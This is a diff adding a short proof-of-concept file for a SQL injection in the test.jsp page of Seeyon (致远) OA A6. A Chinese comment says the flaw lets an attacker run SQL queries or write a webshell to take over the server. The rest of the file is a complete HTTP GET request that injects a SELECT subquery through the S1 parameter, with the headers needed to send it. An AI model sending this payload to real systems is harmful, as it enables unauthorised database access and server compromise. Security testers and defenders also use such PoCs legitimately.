@@ -1,0 +1,9 @@
+# 致远OA A6 test.jsp SQL注入漏洞
+# 致远OA A6 test.jsp 存在sql注入漏洞，并可以通过注入执行sql查询语句或写入webshell文件控制服务器
+GET /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database())&acid=80015022&bid=hd_tag_m8mv2476 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv2476
+RM-PRO-Token: 8d3141259b540b15e25caf0504f714d8
+RM-PRO-Time: 1742808367099
+User-Agent: curl/7.83.1
+
